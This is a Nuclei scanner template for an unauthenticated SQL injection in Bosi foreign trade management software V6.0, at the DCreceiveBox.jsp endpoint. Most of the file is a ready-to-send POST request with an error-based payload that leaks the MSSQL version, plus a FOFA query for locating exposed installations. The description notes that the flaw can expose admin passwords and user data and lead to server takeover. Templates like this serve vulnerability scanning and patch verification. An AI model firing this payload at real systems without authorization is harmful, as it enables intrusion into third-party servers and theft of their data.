http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - Microsoft SQL Server
            - 转换为数据类型为 int 的列时发生语法错误
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /crm/module/DCreceiveBox.jsp HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
          Content-Type: application/x-www-form-urlencoded

          SAVE=1&setCustom=&NOWKEY='and+1=@@version--
id: bosiwaimao-DCreceiveBox_jsp-sql
info:
    author: Superhero
    description: |-
        fofa: title="欢迎使用 博斯软件"
        博斯外贸管理软件V6.0 DCreceiveBox.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 博斯外贸管理软件V6.0 DCreceiveBox.jsp SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/_T3eSiFdRZhRJTcD9I_OEg
    severity: high
    tags: []
